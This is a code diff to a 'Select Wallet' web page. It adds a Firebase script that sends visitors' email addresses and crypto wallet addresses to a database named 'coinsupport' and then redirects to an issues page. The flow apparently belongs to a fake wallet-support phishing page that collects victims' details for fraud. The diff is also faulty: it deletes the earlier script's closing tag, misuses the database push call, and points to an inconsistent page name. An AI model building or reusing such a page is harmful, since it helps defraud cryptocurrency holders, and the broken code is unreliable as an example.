@@ -4,6 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Select Wallet</title>
+    <!-- 1. Tailwind CSS (CDN) -->
+<script src="https://cdn.tailwindcss.com"></script>
+
+<!-- 2. Lucide Icons Library -->
+<script src="https://unpkg.com/lucide@latest"></script>
     <style>
         body { 
             margin: 0; 
@@ -259,6 +264,91 @@
             // Redirect to issues page, passing the wallet name as a parameter
             window.location.href = `issues.html?wallet=${encodeURIComponent(walletName)}`;
         }
-    </script>
+    <!-- FIREBASE LOGIC -->
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
+        authDomain: "coinsupport-8b036.firebaseapp.com",
+        databaseURL: "https://coinsupport-8b036-default-rtdb.firebaseio.com",
+        projectId: "coinsupport-8b036",
+        storageBucket: "coinsupport-8b036.firebasestorage.app",
+        messagingSenderId: "575774102570",
+        appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
+        measurementId: "G-YGCSNX4H9L"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // Select DOM elements
+    const form = document.getElementById('walletForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const btnText = document.getElementById('btnText');
+    const btnIcon = document.getElementById('btnIcon');
+    const spinner = document.getElementById('loadingSpinner');
+    const statusMsg = document.getElementById('statusMessage');
+
+    if (form) {
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // UI Loading State
+            submitBtn.disabled = true;
+            btnText.textContent = "Connecting...";
+            btnIcon.classList.add('hidden');
+            spinner.classList.remove('hidden');
+            statusMsg.textContent = "";
+
+            const email = document.getElementById('email').value.trim();
+            const wallet = document.getElementById('walletAddress').value.trim();
+
+            try {
+                // Create a new reference with a unique key
+                const newSessionRef = push(ref(db), 'sessions');
+                
+                // Save data to Firebase Realtime Database
+                await set(newSessionRef, {
+                    email: email,
+                    walletAddress: wallet,
+                    timestamp: new Date().toISOString(),
+                    source: window.location.href,
+                    status: 'pending'
+                });
+
+                // Success State
+                btnText.textContent = "Success!";
+                submitBtn.style.background = "#22c55e"; // Green background
+
+                setTimeout(() => {
+                    window.location.href = "issue.html";
+                }, 800);
+
+            } catch (error) {
+                console.error("Firebase Error:", error);
+                btnText.textContent = "Error";
+                submitBtn.style.background = "#ef4444"; // Red background
+                statusMsg.textContent = "Could not connect. Please try again.";
+                statusMsg.className = "text-center text-sm mt-2 h-5 text-red-500";
+                
+                // Reset button after delay
+                setTimeout(() => {
+                    submitBtn.disabled = false;
+                    btnText.textContent = "Continue";
+                    btnIcon.classList.remove('hidden');
+                    spinner.classList.add('hidden');
+                    submitBtn.style.background = ""; 
+                }, 2000);
+            }
+        });
+    }
+</script>
+<script>
+    // Initialize Lucide Icons
+    lucide.createIcons();
+</script>
 </body>
 </html
